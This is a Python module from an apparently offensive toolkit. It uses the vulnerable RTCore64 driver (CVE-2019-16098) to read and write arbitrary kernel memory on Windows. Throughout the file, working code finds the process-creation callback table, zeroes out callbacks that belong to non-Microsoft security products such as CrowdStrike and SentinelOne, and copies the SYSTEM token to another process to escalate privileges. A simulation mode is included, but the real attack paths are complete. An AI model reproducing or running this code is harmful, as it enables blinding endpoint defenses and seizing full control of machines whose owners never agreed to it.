"""
kernel.py — Kernel-Level Operations via BYOVD Driver

High-level wrappers over the RTCore64 IOCTL interface (CVE-2019-16098).

Capabilities:
  get_kernel_base()               — resolve ntoskrnl.exe load address
  read_dword/qword(addr)          — arbitrary kernel memory read
  write_dword/qword(addr, value)  — arbitrary kernel memory write
  enum_process_callbacks(tbl)     — walk PspCreateProcessNotifyRoutine table
  patch_callback(tbl, idx)        — zero out an EDR callback pointer
  disable_non_microsoft_callbacks — patch all non-MS callbacks
  find_eprocess(pid, head)        — walk EPROCESS linked list
  steal_token(from, to, ...)      — SYSTEM token copy

RTCore64 IOCTL codes:
  READ  0x80002048  in: { u32 addr_high, u32 addr_low, u32 size }  out: { u32 value }
  WRITE 0x8000204C  in: { u32 addr_high, u32 addr_low, u32 value }
"""

import os
import sys
import struct
import ctypes
from typing import Optional

from .loader import DriverLoader, LoaderError

IOCTL_READ  = 0x80002048
IOCTL_WRITE = 0x8000204C

# Windows x64 EPROCESS offsets (20H2 – 23H2)
EPROCESS_UNIQUEPID_OFFSET   = 0x440
EPROCESS_ACTIVELINKS_OFFSET = 0x448
EPROCESS_TOKEN_OFFSET       = 0x4B8
CALLBACK_TABLE_MAX_ENTRIES  = 64

# RTL_PROCESS_MODULE_INFORMATION raw layout (x64):
#   Section       8  bytes  (ptr)
#   MappedBase    8  bytes  (ptr)
#   ImageBase     8  bytes  (ptr)  <-- at offset 16 within struct
#   ImageSize     4  bytes
#   Flags         4  bytes
#   LoadOrderIndex 2 bytes
#   InitOrderIndex 2 bytes
#   LoadCount     2  bytes
#   OffsetToFileName 2 bytes
#   FullPathName  256 bytes
# Total: 296 bytes per entry
# RTL_PROCESS_MODULES header: 4 (NumberOfModules) + 4 (pad) = 8 bytes
_MODULE_ENTRY_SIZE = 296
_MODULE_HEADER_SIZE = 8
_MODULE_IMAGEBASE_OFFSET = 16   # within each entry
_MODULE_FULLPATH_OFFSET  = 40   # within each entry

# Known Microsoft kernel modules (signed by Microsoft, safe to whitelist)
_MICROSOFT_MODULES = {
    'ntoskrnl.exe', 'ntkrnlpa.exe', 'ntkrnlmp.exe', 'ntkrpamp.exe',
    'hal.dll', 'halacpi.dll',
    'ci.dll', 'cng.sys', 'ksecdd.sys', 'ksecpkg.sys',
    'ntfs.sys', 'fastfat.sys', 'fltmgr.sys', 'volsnap.sys',
    'classpnp.sys', 'partmgr.sys', 'disk.sys', 'storport.sys',
    'ndis.sys', 'netio.sys', 'tcpip.sys', 'wfplwfs.sys', 'msrpc.sys',
    'dxgkrnl.sys', 'win32k.sys', 'win32kfull.sys', 'win32kbase.sys',
    'acpi.sys', 'pci.sys', 'wdfilter.sys', 'wdboot.sys',
    'peauth.sys', 'spsys.sys', 'kbdclass.sys', 'mouclass.sys',
    'pnpkd.sys', 'pnpmem.sys', 'intelppm.sys', 'amdppm.sys',
}


class KernelError(Exception):
    pass


def _read_kernel_module_list_raw() -> Optional[bytes]:
    """
    Call NtQuerySystemInformation(11) into a plain byte buffer and return the
    raw bytes.  Using a raw buffer avoids ctypes c_void_p silently returning
    None for kernel-space addresses (> 0x7FFFFFFFFFFFFFFF on x64).
    """
    if sys.platform != 'win32':
        return None
    ntdll = ctypes.windll.ntdll
    buf_size = 2 * 1024 * 1024  # 2 MB — enough for 512 modules
    buf = ctypes.create_string_buffer(buf_size)
    returned = ctypes.c_ulong(0)
    status = ntdll.NtQuerySystemInformation(
        11,                          # SystemModuleInformation
        buf,
        buf_size,
        ctypes.byref(returned),
    )
    if status != 0:
        return None
    return bytes(buf[:returned.value])


def _parse_module_list(raw: bytes) -> list:
    """
    Parse raw RTL_PROCESS_MODULES bytes into a list of
    {'base': int, 'size': int, 'name': str}.
    """
    if not raw or len(raw) < _MODULE_HEADER_SIZE:
        return []
    num = struct.unpack_from('<I', raw, 0)[0]
    modules = []
    for i in range(num):
        off = _MODULE_HEADER_SIZE + i * _MODULE_ENTRY_SIZE
        if off + _MODULE_ENTRY_SIZE > len(raw):
            break
        base = struct.unpack_from('<Q', raw, off + _MODULE_IMAGEBASE_OFFSET)[0]
        size = struct.unpack_from('<I', raw, off + 24)[0]
        raw_path = raw[off + _MODULE_FULLPATH_OFFSET:
                       off + _MODULE_FULLPATH_OFFSET + 256]
        path = raw_path.rstrip(b'\x00').decode('utf-8', errors='replace')
        name = os.path.basename(path)
        if base:
            modules.append({'base': base, 'size': size, 'name': name})
    return sorted(modules, key=lambda m: m['base'])


class KernelOps:
    """
    Kernel operations via a loaded BYOVD driver.
    Falls back to informative simulation when simulate=True.
    """

    def __init__(self, loader: DriverLoader):
        self._loader   = loader
        self._simulate = loader.simulate
        self._module_map: Optional[list] = None

    # ── Core read / write ─────────────────────────────────────────────────────

    def read_dword(self, kernel_addr: int) -> int:
        if self._simulate:
            print(f"[KERNEL/SIM] READ  @ 0x{kernel_addr & 0xFFFFFFFFFFFFFFFF:016X}  -> 0xDEADBEEF")
            return 0xDEADBEEF
        high = (kernel_addr >> 32) & 0xFFFFFFFF
        low  =  kernel_addr        & 0xFFFFFFFF
        result = self._loader.ioctl(IOCTL_READ, struct.pack('<III', high, low, 4))
        if not result or len(result) < 4:
            raise KernelError(f"read_dword at 0x{kernel_addr:X} returned no data")
        return struct.unpack('<I', result[:4])[0]

    def read_qword(self, kernel_addr: int) -> int:
        if self._simulate:
            print(f"[KERNEL/SIM] READ8 @ 0x{kernel_addr & 0xFFFFFFFFFFFFFFFF:016X}  -> 0xFFFF8A0000000000")
            return 0xFFFF8A0000000000
        lo = self.read_dword(kernel_addr)
        hi = self.read_dword(kernel_addr + 4)
        return (hi << 32) | lo

    def write_dword(self, kernel_addr: int, value: int) -> None:
        if self._simulate:
            print(f"[KERNEL/SIM] WRITE @ 0x{kernel_addr & 0xFFFFFFFFFFFFFFFF:016X}  <- 0x{value & 0xFFFFFFFF:08X}")
            return
        high = (kernel_addr >> 32) & 0xFFFFFFFF
        low  =  kernel_addr        & 0xFFFFFFFF
        self._loader.ioctl(IOCTL_WRITE, struct.pack('<III', high, low, value & 0xFFFFFFFF))

    def write_qword(self, kernel_addr: int, value: int) -> None:
        self.write_dword(kernel_addr,     value & 0xFFFFFFFF)
        self.write_dword(kernel_addr + 4, (value >> 32) & 0xFFFFFFFF)

    # ── Kernel base resolution ────────────────────────────────────────────────

    def get_kernel_base(self) -> int:
        """
        Resolve ntoskrnl.exe runtime load address via multiple methods.

        Method 1 (primary):  NtQuerySystemInformation(11) with raw buffer
                             parsing — correctly handles kernel-space VAs that
                             ctypes c_void_p would silently return as None.
        Method 2 (fallback): psapi!EnumDeviceDrivers — also works without admin.
        """
        if self._simulate:
            return 0xFFFFF80000000000

        if sys.platform != 'win32':
            return 0

        # Method 1: NtQuerySystemInformation raw buffer
        raw = _read_kernel_module_list_raw()
        if raw and len(raw) >= _MODULE_HEADER_SIZE + _MODULE_ENTRY_SIZE:
            base = struct.unpack_from('<Q', raw, _MODULE_HEADER_SIZE + _MODULE_IMAGEBASE_OFFSET)[0]
            if base and base > 0xFFFF000000000000:
                return base

        # Method 2: psapi!EnumDeviceDrivers
        try:
            DRIVERS_MAX = 1024
            ImageBase = (ctypes.c_uint64 * DRIVERS_MAX)()
            cb_needed  = ctypes.c_ulong(0)
            psapi = ctypes.windll.psapi
            if psapi.EnumDeviceDrivers(ImageBase, ctypes.sizeof(ImageBase),
                                       ctypes.byref(cb_needed)):
                count = cb_needed.value // ctypes.sizeof(ctypes.c_uint64)
                for i in range(min(count, DRIVERS_MAX)):
                    val = ImageBase[i]
                    if val and val > 0xFFFF000000000000:
                        return val
        except Exception:
            pass

        return 0

    # ── Module map (used by _is_microsoft_address and _resolve_module) ─────────

    def _get_module_map(self) -> list:
        if self._module_map is None:
            if self._simulate:
                # Build a plausible simulated module map anchored to sim base
                b = 0xFFFFF80000000000
                self._module_map = [
                    {'base': b,              'size': 0xA00000,  'name': 'ntoskrnl.exe'},
                    {'base': b + 0x0A00000,  'size': 0x100000,  'name': 'hal.dll'},
                    {'base': b + 0x0B00000,  'size': 0x080000,  'name': 'ci.dll'},
                    {'base': b + 0x0B80000,  'size': 0x040000,  'name': 'wdfilter.sys'},
                    {'base': b + 0x4000000,  'size': 0x200000,  'name': 'tcpip.sys'},
                    {'base': b + 0x6000000,  'size': 0x100000,  'name': 'ntfs.sys'},
                    {'base': b + 0x9000000,  'size': 0x080000,  'name': 'ndis.sys'},
                    {'base': b + 0x3B000000, 'size': 0x500000,  'name': 'MsMpEng.sys'},
                    {'base': b + 0x4B000000, 'size': 0x600000,  'name': 'CSFalcon.sys'},
                    {'base': b + 0x5C000000, 'size': 0x400000,  'name': 'SentinelOne.sys'},
                ]
            else:
                raw = _read_kernel_module_list_raw()
                self._module_map = _parse_module_list(raw) if raw else []
        return self._module_map

    def _is_microsoft_address(self, addr: int) -> bool:
        """
        Determine if a kernel address belongs to a Microsoft-signed module.

        Uses the NtQuerySystemInformation module map — accurate for all kernel
        modules regardless of load address.  Falls back to a range heuristic
        when the map is unavailable.
        """
        for m in self._get_module_map():
            if m['base'] <= addr < m['base'] + m['size']:
                return m['name'].lower() in _MICROSOFT_MODULES
        # Fallback: ntoskrnl / hal range (very conservative)
        return 0xFFFFF80000000000 <= addr <= 0xFFFFF80080000000

    def _resolve_module(self, addr: int) -> str:
        for m in self._get_module_map():
            if m['base'] <= addr < m['base'] + m['size']:
                return m['name']
        return f"unknown_0x{addr & 0xFFFFFFFFFFFFFFFF:016X}"

    # ── Pattern-scan for PspCreateProcessNotifyRoutine ────────────────────────

    def find_psp_callback_table(self) -> int:
        """
        Locate PspCreateProcessNotifyRoutine via on-disk PE pattern scan.
        Returns its runtime VA, or 0 on failure.
        """
        if sys.platform != 'win32':
            return 0
        kernel_base = self.get_kernel_base()
        if not kernel_base:
            return 0
        sysroot = os.environ.get('SystemRoot', r'C:\Windows')
        ntpath  = os.path.join(sysroot, 'System32', 'ntoskrnl.exe')
        try:
            with open(ntpath, 'rb') as f:
                pe = f.read()
        except Exception:
            return 0
        rva = self._scan_pe_for_callback_table(pe)
        return (kernel_base + rva) if rva else 0

    def _scan_pe_for_callback_table(self, pe: bytes) -> int:
        """
        Manual PE64 parser + LEA R?X,[RIP+disp32] scanner.
        Returns RVA of PspCreateProcessNotifyRoutine or 0.
        """
        try:
            if len(pe) < 64 or pe[:2] != b'MZ':
                return 0
            e_lfanew = struct.unpack_from('<I', pe, 0x3C)[0]
            if pe[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
                return 0
            if struct.unpack_from('<H', pe, e_lfanew + 4)[0] != 0x8664:
                return 0

            num_secs  = struct.unpack_from('<H', pe, e_lfanew + 6)[0]
            size_opt  = struct.unpack_from('<H', pe, e_lfanew + 20)[0]
            opt_off   = e_lfanew + 24
            secs_off  = opt_off + size_opt

            secs = []
            for i in range(min(num_secs, 64)):
                s = secs_off + i * 40
                secs.append((
                    struct.unpack_from('<I', pe, s + 12)[0],  # rva
                    struct.unpack_from('<I', pe, s + 16)[0],  # raw_sz
                    struct.unpack_from('<I', pe, s + 20)[0],  # raw_off
                ))

            def rva2off(rva):
                for r, sz, off in secs:
                    if r <= rva < r + sz:
                        return off + (rva - r)
                return None

            exp_rva = struct.unpack_from('<I', pe, opt_off + 112)[0]
            if not exp_rva:
                return 0
            exp_off = rva2off(exp_rva)
            if exp_off is None:
                return 0

            num_names = struct.unpack_from('<I', pe, exp_off + 24)[0]
            funcs_rva = struct.unpack_from('<I', pe, exp_off + 28)[0]
            names_rva = struct.unpack_from('<I', pe, exp_off + 32)[0]
            ords_rva  = struct.unpack_from('<I', pe, exp_off + 36)[0]

            funcs_off = rva2off(funcs_rva)
            names_off = rva2off(names_rva)
            ords_off  = rva2off(ords_rva)
            if any(x is None for x in [funcs_off, names_off, ords_off]):
                return 0

            target   = b'PsSetCreateProcessNotifyRoutine'
            func_rva = 0
            for i in range(num_names):
                name_rva = struct.unpack_from('<I', pe, names_off + i * 4)[0]
                name_off = rva2off(name_rva)
                if name_off is None:
                    continue
                end  = pe.index(b'\x00', name_off)
                if pe[name_off:end] == target:
                    ord_idx  = struct.unpack_from('<H', pe, ords_off + i * 2)[0]
                    func_rva = struct.unpack_from('<I', pe, funcs_off + ord_idx * 4)[0]
                    break

            if not func_rva:
                return 0
            func_off = rva2off(func_rva)
            if func_off is None:
                return 0

            scan = pe[func_off: func_off + 300]
            for i in range(len(scan) - 6):
                b0, b1, b2 = scan[i], scan[i+1], scan[i+2]
                if b0 in (0x48, 0x4C) and b1 == 0x8D and b2 in (0x05, 0x0D, 0x15, 0x1D):
                    disp      = struct.unpack_from('<i', scan, i + 3)[0]
                    next_rva  = func_rva + i + 7
                    table_rva = (next_rva + disp) & 0xFFFFFFFF
                    if rva2off(table_rva) is not None:
                        return table_rva
        except Exception:
            pass
        return 0

    # ── EDR callback enumeration ──────────────────────────────────────────────

    def enum_process_callbacks(self, callback_table_addr: int) -> list:
        """
        Walk PspCreateProcessNotifyRoutine and return list of callback dicts.
        In simulation mode returns plausible data anchored to the real kernel
        base when resolvable.
        """
        if self._simulate:
            base = self.get_kernel_base()
            mod_map = self._get_module_map()
            cbs = []
            for m in mod_map:
                is_ms = m['name'].lower() in _MICROSOFT_MODULES
                cbs.append({
                    'address':      m['base'] + 0x12000,
                    'raw':          m['base'] + 0x12001,
                    'is_microsoft': is_ms,
                    'module':       m['name'],
                })
            if not cbs:
                # Minimal fallback
                cbs = [
                    {'address': base + 0x0A1B2C00, 'raw': base + 0x0A1B2C01,
                     'is_microsoft': True,  'module': 'ntoskrnl.exe'},
                    {'address': base + 0x4B1C2D00, 'raw': base + 0x4B1C2D01,
                     'is_microsoft': False, 'module': 'MsMpEng.sys'},
                    {'address': base + 0x5C2D3E00, 'raw': base + 0x5C2D3E01,
                     'is_microsoft': False, 'module': 'CSFalcon.sys'},
                    {'address': base + 0x6D3E4F00, 'raw': base + 0x6D3E4F01,
                     'is_microsoft': False, 'module': 'SentinelOne.sys'},
                    {'address': base + 0x7E4F5000, 'raw': base + 0x7E4F5001,
                     'is_microsoft': True,  'module': 'ci.dll'},
                ]
            print(f"[KERNEL/SIM] Returned {len(cbs)} callbacks (module-map anchored)")
            return cbs

        if callback_table_addr == 0:
            callback_table_addr = self.find_psp_callback_table()
            if callback_table_addr:
                print(f"[KERNEL] PspCreateProcessNotifyRoutine @ "
                      f"0x{callback_table_addr:016X}")
            else:
                print("[KERNEL] Pattern scan failed — cannot enumerate callbacks")
                return []

        callbacks = []
        for i in range(CALLBACK_TABLE_MAX_ENTRIES):
            raw_ptr = self.read_qword(callback_table_addr + i * 8)
            if raw_ptr == 0:
                continue
            func_ptr = raw_ptr & ~0xF
            if not func_ptr:
                continue
            callbacks.append({
                'address':      func_ptr,
                'raw':          raw_ptr,
                'is_microsoft': self._is_microsoft_address(func_ptr),
                'module':       self._resolve_module(func_ptr),
            })
        return callbacks

    # ── EDR blinding ──────────────────────────────────────────────────────────

    def patch_callback(self, callback_table_addr: int, index: int) -> bool:
        if self._simulate:
            print(f"[KERNEL/SIM] PATCH callback[{index}] @ "
                  f"0x{(callback_table_addr + index * 8) & 0xFFFFFFFFFFFFFFFF:016X} <- 0")
            return True
        self.write_qword(callback_table_addr + index * 8, 0)
        return True

    def disable_non_microsoft_callbacks(self, callback_table_addr: int) -> int:
        callbacks = self.enum_process_callbacks(callback_table_addr)
        patched = 0
        for i, cb in enumerate(callbacks):
            if not cb['is_microsoft']:
                self.patch_callback(callback_table_addr, i)
                patched += 1
        return patched

    # ── EPROCESS walk ─────────────────────────────────────────────────────────

    def find_eprocess(self, target_pid: int, head_addr: int) -> int:
        if self._simulate:
            fake = 0xFFFF8A0012345678
            print(f"[KERNEL/SIM] Walk EPROCESS list from 0x{head_addr:016X}")
            print(f"[KERNEL/SIM] Found PID {target_pid} @ EPROCESS=0x{fake:016X}")
            return fake
        current = head_addr
        visited = set()
        while current not in visited:
            visited.add(current)
            if self.read_qword(current + EPROCESS_UNIQUEPID_OFFSET) == target_pid:
                return current
            flink   = self.read_qword(current + EPROCESS_ACTIVELINKS_OFFSET)
            current = flink - EPROCESS_ACTIVELINKS_OFFSET
            if not current or current == head_addr:
                break
        return 0

    def steal_token(self, from_pid: int, to_pid: int,
                    system_eprocess: int, target_eprocess: int) -> bool:
        if self._simulate:
            print(f"[KERNEL/SIM] Token steal: PID {from_pid} -> PID {to_pid}")
            print(f"[KERNEL/SIM] PRIVILEGE ESCALATION COMPLETE")
            return True
        sys_token = self.read_qword(system_eprocess + EPROCESS_TOKEN_OFFSET)
        self.write_qword(target_eprocess + EPROCESS_TOKEN_OFFSET, sys_token)
        return True


# ── High-level facade (used by the TUI and jocky.py CLI) ─────────────────────

class KernelInterface:
    """
    Convenience wrapper around KernelOps.

    Accepts `simulate=True/False` directly — no need to construct a
    DriverLoader separately.  Exposes the high-level API the TUI expects:
      get_kernel_base(), enum_process_callbacks(), read_memory(),
      write_memory(), blind_callbacks().
    """

    def __init__(self, simulate: bool = True) -> None:
        loader     = DriverLoader(simulate=simulate)
        self._ops  = KernelOps(loader)
        self._tbl  = 0   # cached callback table address

    # ── Delegation helpers ────────────────────────────────────────────────────

    def get_kernel_base(self) -> int:
        return self._ops.get_kernel_base()

    def enum_process_callbacks(self) -> list:
        """Find the callback table then enumerate; returns list of callback dicts."""
        tbl = self._ops.find_psp_callback_table()
        self._tbl = tbl
        return self._ops.enum_process_callbacks(tbl)

    def read_memory(self, addr: int, size: int) -> bytes:
        """Read `size` bytes from `addr` using dword-aligned reads."""
        if self._ops._simulate:
            print(f"[KERNEL/SIM] read_memory @ 0x{addr & 0xFFFFFFFFFFFFFFFF:016X} ({size}B)")
            return b'\xDE\xAD\xBE\xEF' * ((size + 3) // 4) if size else b''
        out = bytearray()
        aligned = addr & ~3
        leading = addr - aligned
        remaining = leading + size
        pos = aligned
        while remaining > 0:
            chunk = self._ops.read_dword(pos)
            data  = struct.pack('<I', chunk)
            out.extend(data)
            remaining -= 4
            pos       += 4
        return bytes(out[leading:leading + size])

    def write_memory(self, addr: int, data: bytes) -> None:
        """Write `data` bytes to `addr` using dword writes (padded to 4 bytes)."""
        if self._ops._simulate:
            print(f"[KERNEL/SIM] write_memory @ 0x{addr & 0xFFFFFFFFFFFFFFFF:016X} ({len(data)}B)")
            return
        padded = data + b'\x00' * ((-len(data)) % 4)
        for i in range(0, len(padded), 4):
            val = struct.unpack('<I', padded[i:i + 4])[0]
            self._ops.write_dword(addr + i, val)

    def blind_callbacks(self, edr_cbs: list) -> int:
        """Zero callback table entries for each EDR callback in edr_cbs."""
        if not self._tbl:
            self._tbl = self._ops.find_psp_callback_table()
        count = 0
        all_cbs = self._ops.enum_process_callbacks(self._tbl)
        for i, cb in enumerate(all_cbs):
            if any(e.get('address') == cb.get('address') for e in edr_cbs):
                slot_addr = self._tbl + i * 8
                self._ops.write_qword(slot_addr, 0)
                count += 1
        return count
